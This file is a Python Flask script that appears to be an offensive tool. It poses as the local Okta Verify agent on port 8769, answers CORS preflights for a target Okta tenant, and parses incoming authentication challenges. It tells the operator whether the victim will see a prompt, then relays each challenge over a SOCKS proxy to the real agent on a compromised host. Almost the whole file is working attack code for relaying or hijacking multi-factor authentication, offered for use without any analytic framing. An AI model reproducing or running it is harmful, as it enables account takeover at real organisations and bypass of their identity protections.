from urllib import response
import flask
from flask import request, make_response
import lib.okta as okta
import requests
import sys

host = ""
http_proxy = ""

app = flask.Flask(__name__)

@app.route('/probe', methods=['GET', 'OPTIONS'])
def probe():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", host)
        response.headers.add("Access-Control-Allow-Methods", "GET, OPTIONS, POST, HEAD")
        response.headers.add("Access-Control-Allow-Headers", "x-okta-xsrftoken, Origin, X-Requested-With, Content-Type, Accept")
        response.headers.add("Access-Control-Request-Headers", "content-type,x-okta,xsrftoken")
        return response

    response = make_response()
    response.headers.add("Access-Control-Allow-Origin", host)
    response.headers.add("Access-Control-Allow-Methods", "GET, OPTIONS, POST, HEAD")
    response.headers.add("Access-Control-Allow-Headers", "x-okta-xsrftoken, Origin, X-Requested-With, Content-Type, Accept")
    response.headers.add("Access-Control-Request-Headers", "content-type,x-okta,xsrftoken")
    return response

@app.route('/challenge', methods=['POST', 'OPTIONS'])
def challenge():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", host)
        response.headers.add("Access-Control-Allow-Methods", "GET, OPTIONS, POST, HEAD")
        response.headers.add("Access-Control-Allow-Headers", "x-okta-xsrftoken, Origin, X-Requested-With, Content-Type, Accept")
        response.headers.add("Access-Control-Request-Headers", "content-type,x-okta,xsrftoken")
        return response
    
    # Get POST data
    data = request.get_json()

    # Parse the challenge
    challenge_request = data["challengeRequest"]
    challenges = okta.Okta.parseStateToken(challenge_request)

    verification = False

    if len(challenges[0]) == 2:
        verification = True

    if challenges[1] != "OPTIONAL":
        verification = True

    if challenges[2] != "NONE":
        verification = True

    if verification:
        print("[*] Verification request is present, user will receieve a prompt\n")

    if not verification:
        print("[*] No challenges present, user will not receive any notifications\n")

    # Hit enter to continue
    input("Press enter to continue\n")    

    # Forward the challenge to the Okta agent over SOCKS
    resp = requests.post("http://localhost:8769/challenge", json=data, headers=request.headers, proxies={"http": http_proxy, "https": http_proxy})

    response = make_response()
    response.headers.add("Access-Control-Allow-Origin", host)
    response.headers.add("Access-Control-Allow-Methods", "GET, OPTIONS, POST, HEAD")
    response.headers.add("Access-Control-Allow-Headers", "x-okta-xsrftoken, Origin, X-Requested-With, Content-Type, Accept")
    response.headers.add("Access-Control-Request-Headers", "content-type,x-okta,xsrftoken")
    return response

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python ./main.py <okta_host> <socks_proxy_uri>")
        print("Example: python ./main.py https://companyname.okta.com socks4://localhost:9090")
        sys.exit(1)

    host = sys.argv[1]
    http_proxy = sys.argv[2]

    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(debug=False, port=8769)

